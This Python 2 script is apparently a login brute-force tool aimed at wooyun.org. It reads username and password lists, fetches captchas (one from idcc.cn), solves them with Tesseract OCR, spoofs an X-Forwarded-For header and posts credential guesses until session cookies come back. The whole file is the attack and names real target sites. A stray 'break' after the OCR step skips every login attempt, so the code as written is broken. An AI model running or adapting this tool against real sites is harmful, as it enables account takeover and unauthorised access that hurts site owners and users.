# coding: utf-8
import sys,os
import urllib2
import urllib
import cookielib
import time
import cookielib
import urllib2
import urllib
import socket
import sys
import time
import re
import Image
from  pytesseract import *
try:
    import Image
except ImportError:
    from PIL import Image





threshold = 140
table = []
for i in range(256):
    if i < threshold:
        table.append(0)
    else:
        table.append(1)

def guess_login(url, users, passwords):
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    opener.addheaders = [
    ('User-Agent','Mozilla/5.0 (Windows NT 5.1; rv:24.0) Gecko/20100101 Firefox/24.0'),
    ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
    ('Accept-Encoding','gzip, deflate'),
    ('Connection', 'keep-alive'),
    ('X-Forwarded-For','127.0.0.1'),
    ]
    urllib2.install_opener(opener)
    captcha = ''
    #catp_url = 'http://www.wooyun.org/captcha.php'
    catp_url = 'http://www.idcc.cn/include/loginverify.asp?dt=0.42661002728938424'

    #pattern = '^[a-zA-Z0-9]{4}$'
    pattern = '^[0-9]{4}$'
    regex = re.compile(pattern)
    for user in users:
        user = user.strip()
        print user
        find = False
        for password in passwords:
            print password
            while_mark = 1
            password = password.strip()
            while(while_mark):
                opener.open(url)
                pic = opener.open(catp_url)
                content = pic.read()
                f = open('capta.bmp','wb')
                f.write(content)
                f.close()
                time.sleep(1)
                im = Image.open('capta.bmp')
                im = im.convert('L')
                im.save('capta.png')  # or 'test.tif'
                im.show()
                out = im.point(table,'1')
                out.save('capta.png')
                captcha = pytesseract.image_to_string(Image.open('capta.png'))
                print captcha
                break
                re_result = regex.match(captcha)
                if re_result:
                    print user, password, captcha
                    post_data = 'email=%s&password=%s&captcha=%s'%(user,password,captcha)
                    post_url =  'http://www.wooyun.org/user.php?action=login&do=login'
                    resp = opener.open(post_url,post_data)
                    while_mark = 0
                    cookies = resp.info().getheaders('Set-Cookie')
                    if len(cookies):
                        find = True
                        raw_input('Get it!!%s %s'%(user,password))
                else:
                    print '[*]Repeat request'
                    pass
            if find == True:
                break

def run():
    if len(sys.argv) !=3:
        usage()
    url = 'http://www.wooyun.org/user.php?action=login'
    users = open(sys.argv[1],'r').readlines()
    passwords = open(sys.argv[2],'r').readlines()
    guess_login(url, users, passwords)
def usage():
    print 'wooyun.py users.txt passwords.txt'
    exit(0)
if __name__ == '__main__':
    run()
